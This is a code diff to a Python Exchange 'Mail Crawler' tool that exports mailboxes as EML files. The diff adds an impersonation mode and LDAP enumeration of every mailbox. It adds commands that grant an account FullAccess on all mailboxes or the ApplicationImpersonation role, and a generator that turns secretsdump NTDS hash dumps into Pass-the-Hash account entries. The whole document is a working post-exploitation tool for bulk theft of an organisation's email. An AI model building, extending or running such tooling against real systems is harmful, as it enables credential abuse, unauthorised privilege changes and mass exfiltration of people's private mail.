@@ -4,7 +4,7 @@
 Mail Crawler - Exchange Version
 """
 
-import json
+import tomllib
 import os
 import sys
 import logging
@@ -12,7 +12,7 @@ import datetime
 from pathlib import Path
 from typing import List, Dict, Optional, Tuple
 import typer
-from exchangelib import Credentials, Account, DELEGATE, Configuration, Version, Build
+from exchangelib import Credentials, Account, DELEGATE, IMPERSONATION, Configuration, Version, Build
 from exchangelib.folders import FolderCollection
 from exchangelib.protocol import BaseProtocol, NoVerifyHTTPAdapter
 from exchangelib.protocol import Protocol, CachingProtocol
@@ -42,15 +42,15 @@ app = typer.Typer(
     no_args_is_help=True,
 )
 
-_DEFAULT_CONFIG = Path("config.json")
+_DEFAULT_CONFIG = Path("config.toml")
 
 
 def _resolve_config_path(config: Optional[Path]) -> Path:
-    """Parse configuration file path, defaulting to config.json in the same directory as the executable when packaged as EXE"""
+    """Parse configuration file path, defaulting to config.toml in the same directory as the executable when packaged as EXE"""
     if config is not None:
         return config
     if getattr(sys, "frozen", False):
-        return Path(sys.executable).parent / "config.json"
+        return Path(sys.executable).parent / "config.toml"
     return _DEFAULT_CONFIG
 
 
@@ -66,18 +66,18 @@ def _setup_logging(log_file: str) -> None:
     )
 
 
-def load_config_json(config_path: Path) -> tuple[dict, dict]:
-    """Load configuration from a JSON file"""
+def load_config_toml(config_path: Path) -> tuple[dict, dict]:
+    """Load configuration from a TOML file"""
     if not config_path.exists():
         typer.echo(f"❌ Configuration file {config_path} does not exist!", err=True)
         raise typer.Exit(1)
     try:
-        with open(config_path, "r", encoding="utf-8") as f:
-            data = json.load(f)
-        accounts = {k: v for k, v in data.get("accounts", {}).items() if not k.startswith("_")}
+        with open(config_path, "rb") as f:
+            data = tomllib.load(f)
+        accounts = data.get("accounts", {})
         crawler = data.get("crawler", {})
         return accounts, crawler
-    except json.JSONDecodeError as e:
+    except tomllib.TOMLDecodeError as e:
         typer.echo(f"❌ Configuration file format error: {e}", err=True)
         raise typer.Exit(1)
 
@@ -115,6 +115,7 @@ class EmailCrawler:
         port: int = None,
         ntlm_hash: str | None = None,
         output_dir: str = "exports",
+        access_type: str = "delegate",
     ):
         """
         Initialize the email crawler - Exchange version
@@ -127,6 +128,7 @@ class EmailCrawler:
             port: Exchange port (optional)
             ntlm_hash: NTLM hash string, takes precedence over password. Supports pure NT hash (32 hexadecimal characters) or LM:NT format.
             output_dir: Root directory for exported email files
+            access_type: "delegate" (default) or "impersonation". Use "impersonation" when the credentials belong to a service/admin account with ApplicationImpersonation role and email_address is the target user mailbox.
         """
         self.email_address = email_address
         self.username = username
@@ -136,6 +138,7 @@ class EmailCrawler:
         self.port = port
         self.account = None
         self.output_dir = output_dir
+        self.access_type = access_type
 
     def connect(self) -> bool:
         """
@@ -180,11 +183,12 @@ class EmailCrawler:
                 # First, create the Account normally (at this point, CachingProtocol caches the original Protocol instance),
                 # then delete the cache entry, create NTLMHashProtocol (cache miss → actual instantiation),
                 # and finally replace account.protocol to ensure the replacement is done before any EWS requests are made.
+                _exchangelib_access_type = IMPERSONATION if self.access_type == "impersonation" else DELEGATE
                 self.account = Account(
                     primary_smtp_address=self.email_address,
                     config=config,
                     autodiscover=False,
-                    access_type=DELEGATE,
+                    access_type=_exchangelib_access_type,
                 )
                 # Delete the cache entry in CachingProtocol to trigger actual instantiation of NTLMHashProtocol(config=...)
                 del Protocol[config]
@@ -200,11 +204,12 @@ class EmailCrawler:
                 else:
                     credentials = Credentials(username=self.email_address, password=self.password)
 
+                _exchangelib_access_type = IMPERSONATION if self.access_type == "impersonation" else DELEGATE
                 if self.exchange_server:
                     config = Configuration(server=self.exchange_server, credentials=credentials, auth_type="NTLM")
-                    self.account = Account(primary_smtp_address=self.email_address, config=config, autodiscover=False, access_type=DELEGATE)
+                    self.account = Account(primary_smtp_address=self.email_address, config=config, autodiscover=False, access_type=_exchangelib_access_type)
                 else:
-                    self.account = Account(primary_smtp_address=self.email_address, credentials=credentials, autodiscover=True, access_type=DELEGATE)
+                    self.account = Account(primary_smtp_address=self.email_address, credentials=credentials, autodiscover=True, access_type=_exchangelib_access_type)
 
             logger.info("Exchange connection successful")
             return True
@@ -499,53 +504,125 @@ class EmailCrawler:
             self.disconnect()
 
 
-def _run_account(key: str, email_config: dict, days: int, base_output_dir: str, check_only: bool) -> bool:
-    """Execute crawling (or connection check) for a single account"""
-    typer.echo(f"\n{'='*50}")
-    typer.echo(f"Processing account: {key}")
-    typer.echo(f"{'='*50}")
+def _load_targets_from_config(email_config: dict) -> list[str]:
+    """Resolve target mailbox list for impersonation entries."""
+    targets: list[str] = list(email_config.get("targets") or [])
+    targets_file = email_config.get("targets_file", "")
+    if not targets and targets_file:
+        tf_path = Path(targets_file)
+        if not tf_path.exists():
+            typer.echo(f"❌ targets_file not found: {targets_file}", err=True)
+            raise typer.Exit(1)
+        for line in tf_path.read_text(encoding="utf-8").splitlines():
+            line = line.strip()
+            if line and not line.startswith("#"):
+                targets.append(line)
+    return targets
 
-    typer.echo(f"Email address: {email_config['email_address']}")
-    typer.echo(f"Exchange server: {email_config.get('exchange_server', 'Auto Discover')}")
-    if days == 0:
-        typer.echo("Fetch range: All emails (no time limit)")
-    else:
-        typer.echo(f"Fetch days: Last {days} days")
 
-    use_ntlm_hash = bool(email_config.get("ntlm_hash"))
-    auth_mode = "NTLM hash authentication (Pass-the-Hash)" if use_ntlm_hash else "Plain password authentication"
-    typer.echo(f"Authentication mode: {auth_mode}")
-
-    key_output_dir = os.path.join(base_output_dir, key)
+def _crawl_single(
+    email_address: str,
+    email_config: dict,
+    days: int,
+    output_dir: str,
+    check_only: bool,
+    access_type: str = "delegate",
+    label: str = "",
+) -> bool:
+    """Instantiate EmailCrawler and run crawl (or connection check) for one mailbox."""
+    display = label or email_address
+    typer.echo(f"  Target: {email_address}")
 
     crawler = EmailCrawler(
-        email_address=email_config["email_address"],
+        email_address=email_address,
         username=email_config.get("username"),
         password=email_config.get("password"),
         exchange_server=email_config.get("exchange_server"),
         port=email_config.get("port"),
         ntlm_hash=email_config.get("ntlm_hash"),
-        output_dir=key_output_dir,
+        output_dir=output_dir,
+        access_type=access_type,
     )
     if not check_only:
-        os.makedirs(key_output_dir, exist_ok=True)
+        os.makedirs(output_dir, exist_ok=True)
 
     if check_only:
         ok = crawler.connect()
         crawler.disconnect()
         if ok:
-            typer.echo(f"✅ {key} Connection successful!")
+            typer.echo(f"  ✅ {display} Connection successful!")
         else:
-            typer.echo(f"❌ {key} Connection failed, please check the logs.")
+            typer.echo(f"  ❌ {display} Connection failed, please check the logs.")
         return ok
     else:
         success = crawler.run_crawler(days)
         if success:
-            typer.echo(f"✅ {key} Emails exported successfully!")
-            typer.echo(f"Emails saved to: {key_output_dir}")
+            typer.echo(f"  ✅ {display} Emails exported successfully! → {output_dir}")
         else:
-            typer.echo(f"❌ {key} Email export failed, please check the logs.")
+            typer.echo(f"  ❌ {display} Email export failed, please check the logs.")
         return success
+
+
+def _run_account(key: str, email_config: dict, days: int, base_output_dir: str, check_only: bool) -> bool:
+    """Execute crawling (or connection check) for a single account config entry."""
+    typer.echo(f"\n{'='*50}")
+    typer.echo(f"Processing account: {key}")
+    typer.echo(f"{'='*50}")
+
+    access_type = email_config.get("access_type", "delegate").lower()
+    typer.echo(f"Access type     : {access_type}")
+    typer.echo(f"Exchange server : {email_config.get('exchange_server', 'Auto Discover')}")
+    if days == 0:
+        typer.echo("Fetch range     : All emails (no time limit)")
+    else:
+        typer.echo(f"Fetch days      : Last {days} days")
+
+    use_ntlm_hash = bool(email_config.get("ntlm_hash"))
+    auth_mode = "NTLM hash (Pass-the-Hash)" if use_ntlm_hash else "Plain password"
+    typer.echo(f"Authentication  : {auth_mode}")
+
+    if access_type == "impersonation":
+        # Admin credentials impersonating a list of target mailboxes
+        targets = _load_targets_from_config(email_config)
+        if not targets:
+            typer.echo("❌ Impersonation mode requires 'targets' list or 'targets_file' in config.", err=True)
+            return False
+        typer.echo(f"Impersonation targets: {len(targets)} mailbox(es)")
+        results = []
+        for target in targets:
+            # Use target email as the email_address; admin creds stay in email_config
+            target_output = os.path.join(base_output_dir, key, _sanitize_name(target))
+            ok = _crawl_single(
+                email_address=target,
+                email_config=email_config,
+                days=days,
+                output_dir=target_output,
+                check_only=check_only,
+                access_type="impersonation",
+                label=f"{key}/{target}",
+            )
+            results.append(ok)
+        return all(results)
+    else:
+        # Delegate or PTH: use email_address from config directly
+        key_output_dir = os.path.join(base_output_dir, key)
+        typer.echo(f"Email address   : {email_config['email_address']}")
+        return _crawl_single(
+            email_address=email_config["email_address"],
+            email_config=email_config,
+            days=days,
+            output_dir=key_output_dir,
+            check_only=check_only,
+            access_type=access_type,
+            label=key,
+        )
+
+
+def _sanitize_name(name: str) -> str:
+    """Sanitize a string for use as a directory component."""
+    for ch in '/\\:*?"<>|':
+        name = name.replace(ch, "_")
+    return name
 
 
 @app.command()
@@ -553,12 +630,12 @@ def run(
     accounts: Optional[List[str]] = typer.Argument(None, help="Email addresses to process (process all if not specified)"),
     days: Optional[int] = typer.Option(None, "--days", "-d", help="Fetch emails from the last N days, 0 for no limit"),
     output_dir: Optional[str] = typer.Option(None, "--output-dir", "-o", help="Root directory for email output"),
-    config: Optional[Path] = typer.Option(None, "--config", "-c", help="Configuration file path (default: config.json)"),
+    config: Optional[Path] = typer.Option(None, "--config", "-c", help="Configuration file path (default: config.toml)"),
     check_only: bool = typer.Option(False, "--check-only", help="Only check connection, do not download emails"),
 ):
     """Download emails and save as EML files"""
     config_path = _resolve_config_path(config)
-    email_configs, crawler_config = load_config_json(config_path)
+    email_configs, crawler_config = load_config_toml(config_path)
 
     log_file = crawler_config.get("log_file", "email_crawler.log")
     _setup_logging(log_file)
@@ -588,11 +665,11 @@ def run(
 
 @app.command("list")
 def list_accounts(
-    config: Optional[Path] = typer.Option(None, "--config", "-c", help="Configuration file path (default: config.json)"),
+    config: Optional[Path] = typer.Option(None, "--config", "-c", help="Configuration file path (default: config.toml)"),
 ):
     """List all configured email accounts in the configuration file"""
     config_path = _resolve_config_path(config)
-    email_configs, crawler_config = load_config_json(config_path)
+    email_configs, crawler_config = load_config_toml(config_path)
 
     typer.echo(f"Configuration file: {config_path}")
     typer.echo(f"\nTotal {len(email_configs)} accounts:\n")
@@ -605,16 +682,27 @@ def list_accounts(
         typer.echo(f"    Authentication: {auth}")
         if cfg.get("username"):
             typer.echo(f"    Username      : {cfg['username']}")
+        access_type = cfg.get("access_type", "delegate")
+        typer.echo(f"    Access Type   : {access_type}")
+        if access_type == "impersonation":
+            targets_inline = cfg.get("targets") or []
+            targets_file = cfg.get("targets_file", "")
+            if targets_inline:
+                typer.echo(f"    Targets       : {len(targets_inline)} inline")
+            elif targets_file:
+                typer.echo(f"    Targets File  : {targets_file}")
+            else:
+                typer.echo("    Targets       : (none configured)")
 
 
 @app.command()
 def check(
     accounts: Optional[List[str]] = typer.Argument(None, help="Email addresses to check (check all if not specified)"),
-    config: Optional[Path] = typer.Option(None, "--config", "-c", help="Configuration file path (default: config.json)"),
+    config: Optional[Path] = typer.Option(None, "--config", "-c", help="Configuration file path (default: config.toml)"),
 ):
     """Check if email connections are working (do not download emails)"""
     config_path = _resolve_config_path(config)
-    email_configs, crawler_config = load_config_json(config_path)
+    email_configs, crawler_config = load_config_toml(config_path)
 
     log_file = crawler_config.get("log_file", "email_crawler.log")
     _setup_logging(log_file)
@@ -638,6 +726,281 @@ def check(
         status = "✅ Success" if ok else "❌ Failure"
         typer.echo(f"  {key}: {status}")
     typer.echo("=" * 50)
+
+
+def _load_admin_config(
+    config_path: Path,
+    server: Optional[str],
+    username: Optional[str],
+    password: Optional[str],
+    no_ssl: bool = False,
+    port: Optional[int] = None,
+):
+    """Load admin credentials: CLI args take precedence over config.toml admin block."""
+    _, _ = load_config_toml(config_path)  # validate config exists
+
+    with open(config_path, "rb") as f:
+        raw = tomllib.load(f)
+
+    admin_block = raw.get("admin", {})
+    resolved_server = server or admin_block.get("exchange_server", "")
+    resolved_user = username or admin_block.get("username", "")
+    resolved_pass = password or admin_block.get("password", "")
+
+    if not resolved_server:
+        typer.echo("❌ Exchange server is required. Provide --server or set admin.exchange_server in config.", err=True)
+        raise typer.Exit(1)
+    if not resolved_user or not resolved_pass:
+        typer.echo("❌ Admin credentials are required. Provide --username/--password or set admin block in config.", err=True)
+        raise typer.Exit(1)
+
+    ssl = (not no_ssl) if no_ssl else admin_block.get("ssl", True)
+    ssl_verify = admin_block.get("ssl_verify", False)
+    auth = admin_block.get("auth", "negotiate")
+    resolved_port = port or admin_block.get("port") or None
+    return resolved_server, resolved_user, resolved_pass, ssl, ssl_verify, auth, resolved_port
+
+
+@app.command("enum-mailboxes")
+def enum_mailboxes(
+    output: Optional[str] = typer.Option(None, "--output", "-o", help="Output file path for the mailbox list (one per line). Prints to stdout if omitted."),
+    dc: Optional[str] = typer.Option(None, "--dc", help="Domain controller IP/hostname for LDAP enumeration (default: same as --server)"),
+    server: Optional[str] = typer.Option(None, "--server", "-s", help="Exchange server hostname (used as DC if --dc is not given)"),
+    domain: Optional[str] = typer.Option(None, "--domain", "-d", help="Domain name for LDAP NTLM auth, e.g. randark.local"),
+    username: Optional[str] = typer.Option(None, "--username", "-u", help="Admin username (SAMAccountName, without domain prefix)"),
+    password: Optional[str] = typer.Option(None, "--password", "-p", help="Admin password"),
+    ldap_port: int = typer.Option(389, "--ldap-port", help="LDAP port (default 389; use 636 for LDAPS)"),
+    base_dn: Optional[str] = typer.Option(None, "--base-dn", help="LDAP search base DN (auto-derived from domain if omitted)"),
+    user_only: bool = typer.Option(False, "--user-only", help="Filter out system mailboxes (HealthMailbox, SystemMailbox, DiscoverySearchMailbox, FederatedEmail, Migration)"),
+    config: Optional[Path] = typer.Option(None, "--config", "-c", help="Configuration file path (default: config.toml)"),
+):
+    """Enumerate all mailbox-enabled users via LDAP (NTLM auth, no PowerShell endpoint required)."""
+    from core.exchange_admin import LdapMailboxEnumerator
+
+    config_path = _resolve_config_path(config)
+
+    with open(config_path, "rb") as f:
+        raw = tomllib.load(f)
+    admin_block = raw.get("admin", {})
+
+    resolved_dc = dc or server or admin_block.get("exchange_server", "")
+    resolved_user = username or admin_block.get("username", "")
+    resolved_pass = password or admin_block.get("password", "")
+    resolved_domain = domain or admin_block.get("domain", "")
+
+    if not resolved_dc:
+        typer.echo("❌ DC/server is required. Provide --dc/--server or set admin.exchange_server in config.", err=True)
+        raise typer.Exit(1)
+    if not resolved_user or not resolved_pass:
+        typer.echo("❌ Credentials required. Provide --username/--password or set admin block in config.", err=True)
+        raise typer.Exit(1)
+
+    # Extract SAMAccountName (strip domain prefix if present)
+    sam = resolved_user.split("\\")[-1] if "\\" in resolved_user else resolved_user.split("@")[0]
+
+    # Derive domain from username if not explicitly provided
+    if not resolved_domain:
+        if "\\" in resolved_user:
+            resolved_domain = resolved_user.split("\\")[0]
+        elif "@" in resolved_user:
+            resolved_domain = resolved_user.split("@")[1]
+        else:
+            typer.echo("❌ Cannot derive domain. Provide --domain or use DOMAIN\\\\user format.", err=True)
+            raise typer.Exit(1)
+
+    use_ldaps = ldap_port == 636
+    typer.echo(f"Enumerating mailboxes via LDAP on {resolved_dc}:{ldap_port} (domain={resolved_domain}, user={sam})...")
+
+    enumerator = LdapMailboxEnumerator(
+        dc_host=resolved_dc,
+        domain=resolved_domain,
+        username=sam,
+        password=resolved_pass,
+        port=ldap_port,
+        use_ssl=use_ldaps,
+        base_dn=base_dn or None,
+    )
+    mailboxes = enumerator.enum_mailboxes()
+    enumerator.close()
+
+    if user_only:
+        _SYSTEM_PREFIXES = (
+            "healthmailbox",
+            "systemmailbox",
+            "discoverysearchmailbox",
+            "federatedemail",
+            "migration.",
+        )
+        before = len(mailboxes)
+        mailboxes = [m for m in mailboxes if not m.lower().split("@")[0].startswith(_SYSTEM_PREFIXES)]
+        typer.echo(f"Filtered {before - len(mailboxes)} system mailbox(es).")
+
+    typer.echo(f"Found {len(mailboxes)} mailbox(es).")
+
+    if output:
+        out_path = Path(output)
+        out_path.write_text("\n".join(mailboxes), encoding="utf-8")
+        typer.echo(f"Mailbox list saved to: {out_path}")
+    else:
+        for mb in mailboxes:
+            typer.echo(mb)
+
+
+@app.command("grant-access")
+def grant_access(
+    targets: Optional[List[str]] = typer.Argument(None, help="Target mailbox addresses. If omitted, --all flag or --targets-file is required."),
+    trustee: Optional[str] = typer.Option(None, "--trustee", "-t", help="Account to receive FullAccess (defaults to admin username from config)"),
+    all_mailboxes: bool = typer.Option(False, "--all", help="Grant FullAccess on ALL mailboxes in the organisation"),
+    targets_file: Optional[str] = typer.Option(None, "--targets-file", "-f", help="File containing target mailbox addresses (one per line)"),
+    automapping: bool = typer.Option(False, "--automapping", help="Enable Outlook auto-mapping of the mailbox"),
+    server: Optional[str] = typer.Option(None, "--server", "-s", help="Exchange server hostname"),
+    username: Optional[str] = typer.Option(None, "--username", "-u", help="Admin username"),
+    password: Optional[str] = typer.Option(None, "--password", "-p", help="Admin password"),
+    no_ssl: bool = typer.Option(False, "--no-ssl", help="Use HTTP (port 5985) instead of HTTPS (port 5986)"),
+    port: Optional[int] = typer.Option(None, "--port", help="Override WinRM port"),
+    config: Optional[Path] = typer.Option(None, "--config", "-c", help="Configuration file path (default: config.toml)"),
+):
+    """Grant FullAccess on target mailboxes to an admin account (Scheme A prerequisite)."""
+    from core.exchange_admin import ExchangeAdminSession
+
+    config_path = _resolve_config_path(config)
+    resolved_server, resolved_user, resolved_pass, ssl, ssl_verify, auth, resolved_port = _load_admin_config(
+        config_path, server, username, password, no_ssl=no_ssl, port=port
+    )
+    effective_trustee = trustee or resolved_user
+
+    session = ExchangeAdminSession(
+        server=resolved_server,
+        username=resolved_user,
+        password=resolved_pass,
+        ssl=ssl,
+        ssl_verify=ssl_verify,
+        auth=auth,
+        port=resolved_port,
+    )
+
+    # Resolve target list
+    mailbox_list: list[str] = list(targets or [])
+    if targets_file:
+        tf = Path(targets_file)
+        if not tf.exists():
+            typer.echo(f"❌ targets-file not found: {targets_file}", err=True)
+            raise typer.Exit(1)
+        for line in tf.read_text(encoding="utf-8").splitlines():
+            line = line.strip()
+            if line and not line.startswith("#"):
+                mailbox_list.append(line)
+    if all_mailboxes:
+        typer.echo("Enumerating all mailboxes...")
+        mailbox_list = session.enum_mailboxes()
+
+    if not mailbox_list:
+        typer.echo("❌ No target mailboxes specified. Use arguments, --targets-file, or --all.", err=True)
+        raise typer.Exit(1)
+
+    typer.echo(f"Granting FullAccess on {len(mailbox_list)} mailbox(es) to {effective_trustee}...")
+    results = session.grant_fullaccess_bulk(mailbox_list, effective_trustee, automapping=automapping)
+
+    ok_count = sum(1 for v in results.values() if v)
+    fail_count = len(results) - ok_count
+    typer.echo(f"\n✅ Success: {ok_count}  ❌ Failed: {fail_count}")
+    for mb, ok in results.items():
+        status = "✅" if ok else "❌"
+        typer.echo(f"  {status} {mb}")
+
+
+@app.command("grant-impersonation")
+def grant_impersonation(
+    trustee: Optional[str] = typer.Option(None, "--trustee", "-t", help="Account to receive ApplicationImpersonation role (defaults to admin username from config)"),
+    assignment_name: Optional[str] = typer.Option(None, "--assignment-name", help="Custom name for the role assignment"),
+    server: Optional[str] = typer.Option(None, "--server", "-s", help="Exchange server hostname"),
+    username: Optional[str] = typer.Option(None, "--username", "-u", help="Admin username"),
+    password: Optional[str] = typer.Option(None, "--password", "-p", help="Admin password"),
+    no_ssl: bool = typer.Option(False, "--no-ssl", help="Use HTTP (port 5985) instead of HTTPS (port 5986)"),
+    port: Optional[int] = typer.Option(None, "--port", help="Override WinRM port"),
+    config: Optional[Path] = typer.Option(None, "--config", "-c", help="Configuration file path (default: config.toml)"),
+):
+    """Grant ApplicationImpersonation role to an account (Scheme B prerequisite)."""
+    from core.exchange_admin import ExchangeAdminSession
+
+    config_path = _resolve_config_path(config)
+    resolved_server, resolved_user, resolved_pass, ssl, ssl_verify, auth, resolved_port = _load_admin_config(
+        config_path, server, username, password, no_ssl=no_ssl, port=port
+    )
+    effective_trustee = trustee or resolved_user
+
+    session = ExchangeAdminSession(
+        server=resolved_server,
+        username=resolved_user,
+        password=resolved_pass,
+        ssl=ssl,
+        ssl_verify=ssl_verify,
+        auth=auth,
+        port=resolved_port,
+    )
+
+    typer.echo(f"Granting ApplicationImpersonation to {effective_trustee}...")
+    session.grant_impersonation(effective_trustee, assignment_name=assignment_name or "")
+    typer.echo(f"✅ ApplicationImpersonation granted to {effective_trustee}.")
+    typer.echo("You can now use access_type=\"impersonation\" entries in config.toml.")
+
+
+@app.command("gen-config")
+def gen_config(
+    ntds_file: str = typer.Argument(..., help="Path to secretsdump NTLM output file"),
+    mailboxes_file: str = typer.Argument(..., help="Path to mailbox list file (one address per line, e.g. from enum-mailboxes)"),
+    exchange_server: str = typer.Option(..., "--server", "-s", help="Exchange server hostname to embed in generated entries"),
+    output: Optional[str] = typer.Option(None, "--output", "-o", help="Write merged config to this file instead of stdout"),
+    merge: Optional[Path] = typer.Option(None, "--merge", "-m", help="Existing config.toml to merge accounts into"),
+    config: Optional[Path] = typer.Option(None, "--config", "-c", help="Base config.toml (used as merge base when --merge not given)"),
+):
+    """
+    Generate config.toml account entries from NTDS hash dump + mailbox list (Scheme C).
+
+    Reads a secretsdump NTLM output and a list of mailbox addresses, cross-references
+    them by username, and produces ready-to-use MailCrawler account entries with ntlm_hash.
+    """
+    import tomli_w
+    from core.ntds_helper import parse_secretsdump_output, build_accounts_config
+
+    ntds_path = Path(ntds_file)
+    mb_path = Path(mailboxes_file)
+
+    if not ntds_path.exists():
+        typer.echo(f"❌ NTDS file not found: {ntds_file}", err=True)
+        raise typer.Exit(1)
+    if not mb_path.exists():
+        typer.echo(f"❌ Mailboxes file not found: {mailboxes_file}", err=True)
+        raise typer.Exit(1)
+
+    # Parse inputs
+    hash_map = parse_secretsdump_output(ntds_path)
+    mailbox_list = [
+        line.strip()
+        for line in mb_path.read_text(encoding="utf-8").splitlines()
+        if line.strip() and not line.strip().startswith("#")
+    ]
+    typer.echo(f"Loaded {len(hash_map)} hash entries, {len(mailbox_list)} mailboxes.")
+
+    new_accounts = build_accounts_config(hash_map, mailbox_list, exchange_server)
+    typer.echo(f"Matched {len(new_accounts)} account(s).")
+
+    # Determine base config to merge into
+    base_config_path = merge or config or _resolve_config_path(None)
+    if base_config_path.exists():
+        with open(base_config_path, "rb") as f:
+            base = tomllib.load(f)
+    else:
+        base = {"crawler": {"days": 0, "output_dir": "eml_exports", "log_file": "email_crawler.log"}, "accounts": {}}
+
+    base.setdefault("accounts", {}).update(new_accounts)
+
+    if output:
+        out_path = Path(output)
+        out_path.write_bytes(tomli_w.dumps(base).encode())
+        typer.echo(f"✅ Config written to: {out_path}")
+    else:
+        typer.echo(tomli_w.dumps(base))
 
 
 if __name__ == "__main__":
